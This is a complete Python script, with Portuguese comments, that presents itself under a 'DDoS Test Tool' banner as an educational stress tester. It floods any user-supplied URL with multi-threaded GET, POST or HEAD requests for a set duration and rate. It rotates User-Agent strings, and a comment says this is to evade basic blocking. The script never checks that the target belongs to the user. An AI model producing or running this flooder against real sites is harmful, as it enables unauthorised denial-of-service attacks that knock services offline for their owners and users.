import requests
import threading
import time
import random
from datetime import datetime
import sys
import os

# Lista de User-Agents aleatórios para evitar bloqueios básicos
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

# Métodos HTTP suportados
HTTP_METHODS = ["GET", "POST", "HEAD"]

def clear_screen():
    """Limpa a tela do console"""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Exibe o banner estilizado"""
    print("""
    \033[1;31m
    ██████╗ ██████╗  ██████╗ ███████╗    ████████╗███████╗███████╗████████╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
    ██║  ██║██║  ██║██║   ██║███████╗       ██║   █████╗  ███████╗   ██║   
    ██║  ██║██║  ██║██║   ██║╚════██║       ██║   ██╔══╝  ╚════██║   ██║   
    ██████╔╝██████╔╝╚██████╔╝███████║       ██║   ███████╗███████║   ██║   
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝   ╚══════╝╚══════╝   ╚═╝   
    \033[0m
    \033[1;33m[+] Stress Test Tool - For Educational Purposes Only [+]\033[0m
    \033[1;36mVersion: 2.0 | Author: Anonymous | License: MIT\033[0m
    """)

def display_menu():
    """Exibe o menu de opções"""
    print("\n\033[1;34m[ MENU ]\033[0m")
    print("\033[1;32m1. Start Test")
    print("2. Configure Test Parameters")
    print("3. View Previous Logs")
    print("4. Exit\033[0m")

def send_request(url, method="GET", timeout=5):
    """Envia uma requisição HTTP"""
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=timeout)
        elif method == "POST":
            response = requests.post(url, headers=headers, timeout=timeout)
        elif method == "HEAD":
            response = requests.head(url, headers=headers, timeout=timeout)
        
        log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[1;34m{method}\033[0m {url} - \033[1;32mStatus: {response.status_code}\033[0m"
        print(log)
        return log
    except requests.exceptions.RequestException as e:
        error_log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[1;31mError: {method} {url} - {str(e)}\033[0m"
        print(error_log)
        return error_log

def ddos_test(url, method="GET", num_threads=10, duration=60, requests_per_second=10):
    """Executa o teste de carga controlado"""
    clear_screen()
    display_banner()
    
    print(f"\n\033[1;33m[+] Starting controlled test on {url} ({method}) for {duration} seconds...\033[0m")
    print(f"\033[1;36m[+] Threads: {num_threads} | Max Requests/s: {requests_per_second}\033[0m\n")
    
    logs = []
    end_time = time.time() + duration
    request_interval = 1.0 / requests_per_second  # Intervalo entre requisições

    def worker():
        while time.time() < end_time:
            log = send_request(url, method)
            logs.append(log)
            time.sleep(request_interval)  # Controla a taxa de requisições

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Barra de progresso
    print("\n\033[1;35mTest Progress:\033[0m")
    start_time = time.time()
    while time.time() < end_time:
        elapsed = time.time() - start_time
        remaining = max(0, duration - elapsed)
        progress = min(100, (elapsed / duration) * 100)
        
        sys.stdout.write("\r")
        sys.stdout.write(f"[{'=' * int(progress/2)}{' ' * (50 - int(progress/2))}] {progress:.1f}% | "
                         f"Elapsed: {elapsed:.1f}s | Remaining: {remaining:.1f}s")
        sys.stdout.flush()
        time.sleep(0.1)

    for thread in threads:
        thread.join()

    # Salva logs em um arquivo
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f"ddos_test_log_{timestamp}.txt"
    with open(log_filename, "w") as f:
        f.write("\n".join(logs))
    
    print(f"\n\n\033[1;32m[+] Test completed. Logs saved to '{log_filename}'.\033[0m")
    input("\nPress Enter to return to menu...")

def view_logs():
    """Visualiza logs anteriores"""
    clear_screen()
    display_banner()
    
    print("\n\033[1;33m[ PREVIOUS LOGS ]\033[0m")
    
    log_files = [f for f in os.listdir() if f.startswith("ddos_test_log_") and f.endswith(".txt")]
    
    if not log_files:
        print("\033[1;31mNo log files found.\033[0m")
        input("\nPress Enter to return to menu...")
        return
    
    for i, log_file in enumerate(log_files, 1):
        print(f"{i}. {log_file}")
    
    try:
        choice = int(input("\nSelect log file to view (0 to cancel): "))
        if choice == 0:
            return
        selected_file = log_files[choice-1]
        
        with open(selected_file, "r") as f:
            logs = f.read()
        
        clear_screen()
        print(f"\n\033[1;33mContents of {selected_file}:\033[0m\n")
        print(logs)
        
    except (ValueError, IndexError):
        print("\033[1;31mInvalid selection.\033[0m")
    except Exception as e:
        print(f"\033[1;31mError: {str(e)}\033[0m")
    
    input("\nPress Enter to return to menu...")

def configure_test():
    """Configura os parâmetros do teste"""
    clear_screen()
    display_banner()
    
    print("\n\033[1;33m[ CONFIGURE TEST ]\033[0m")
    
    config = {
        "url": input("Enter target URL (e.g., http://example.com): ").strip(),
        "method": input("HTTP Method (GET/POST/HEAD, default GET): ").strip().upper() or "GET",
        "num_threads": int(input("Number of threads (default 10): ") or 10),
        "duration": int(input("Test duration in seconds (default 60): ") or 60),
        "requests_per_second": int(input("Max requests per second (default 10): ") or 10)
    }
    
    if config["method"] not in HTTP_METHODS:
        print("\033[1;33mInvalid HTTP method. Using GET.\033[0m")
        config["method"] = "GET"
    
    return config

def main():
    """Função principal"""
    clear_screen()
    display_banner()
    
    # Configurações padrão
    test_config = {
        "url": "",
        "method": "GET",
        "num_threads": 10,
        "duration": 60,
        "requests_per_second": 10
    }
    
    while True:
        clear_screen()
        display_banner()
        display_menu()
        
        choice = input("\n\033[1;35mSelect an option: \033[0m")
        
        if choice == "1":  # Start Test
            if not test_config["url"]:
                print("\033[1;31mPlease configure test parameters first.\033[0m")
                input("\nPress Enter to continue...")
                continue
                
            ddos_test(
                test_config["url"],
                test_config["method"],
                test_config["num_threads"],
                test_config["duration"],
                test_config["requests_per_second"]
            )
            
        elif choice == "2":  # Configure Test
            new_config = configure_test()
            test_config.update(new_config)
            print("\033[1;32mConfiguration saved.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == "3":  # View Logs
            view_logs()
            
        elif choice == "4":  # Exit
            print("\n\033[1;33m[+] Exiting... Thank you for using DDoS Test Tool!\033[0m")
            time.sleep(1)
            break
            
        else:
            print("\033[1;31mInvalid option. Please try again.\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[1;33m[+] Operation cancelled by user. Exiting...\033[0m")
        sys.exit(0)
